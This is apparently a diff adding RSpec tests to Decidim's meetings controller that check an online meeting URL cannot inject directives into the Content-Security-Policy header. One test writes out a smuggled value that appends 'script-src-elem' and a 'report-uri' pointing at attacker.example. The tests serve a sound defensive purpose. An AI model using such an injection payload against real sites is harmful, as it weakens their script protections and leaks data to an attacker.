@@ -106,6 +106,34 @@ describe Decidim::Meetings::MeetingsController do
         expect(flash[:alert]).to be_blank
       end
 
+      context "with an online meeting" do
+        let(:meeting) { create(:meeting, :published, :online, component: meeting_component) }
+
+        it "does not allow CSP injection through online_meeting_url" do
+          meeting.update!(online_meeting_url: "https://meet.evil.example/?a=1;script-src-elem 'none';report-uri https://attacker.example/collect")
+
+          expect { get :show, params: { id: meeting.id } }.not_to raise_error
+
+          csp = response.headers["Content-Security-Policy"]
+          expect(csp).not_to include("report-uri https://attacker.example/collect")
+          expect(csp).not_to include("script-src-elem 'none'")
+          expect(csp).to include("frame-src 'self' www.youtube-nocookie.com player.vimeo.com")
+        end
+
+        context "when online_meeting_url points to an embeddable service" do
+          let(:meeting) do
+            create(:meeting, :published, :online, :embeddable, component: meeting_component)
+          end
+
+          it "adds the transformed URL to frame-src" do
+            get :show, params: { id: meeting.id }
+
+            csp = response.headers["Content-Security-Policy"]
+            expect(csp).to include("frame-src 'self' www.youtube-nocookie.com player.vimeo.com https://www.youtube-nocookie.com/embed/pj_2G3x6-Zk")
+          end
+        end
+      end
+
       it "can access private but transparent meetings" do
         meeting.update(private_meeting: true, transparent: true)
 
